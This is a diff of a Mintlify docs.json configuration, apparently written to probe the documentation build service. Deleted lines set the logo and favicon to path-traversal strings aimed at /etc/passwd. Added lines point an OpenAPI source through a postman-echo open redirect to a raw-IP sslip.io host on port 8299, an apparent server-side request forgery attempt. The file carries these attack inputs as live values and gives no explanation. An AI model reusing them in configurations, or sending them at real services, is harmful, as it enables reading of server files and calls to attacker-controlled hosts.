@@ -1,9 +1,11 @@
 {
  "$schema": "https://mintlify.com/docs.json",
- "name": "Probe797",
+ "name": "mmintprobe299",
  "theme": "mint",
  "colors": {
-  "primary": "#000000"
+  "primary": "#FF0000",
+  "light": "#FFFFFF",
+  "dark": "#111111"
  },
  "navigation": {
   "groups": [
@@ -12,12 +14,13 @@
     "pages": [
      "index"
     ]
+   },
+   {
+    "group": "Probe821",
+    "openapi": [
+     "https://postman-echo.com/redirect-to?url=http%3A%2F%2F174.138.181.250.sslip.io%3A8299%2Foa%2Fghoaqlld"
+    ]
    }
   ]
- },
- "logo": {
-  "light": "../../../../etc/passwd",
-  "dark": "../../../../../../etc/passwd"
- },
- "favicon": "../../../../etc/passwd"
+ }
 }
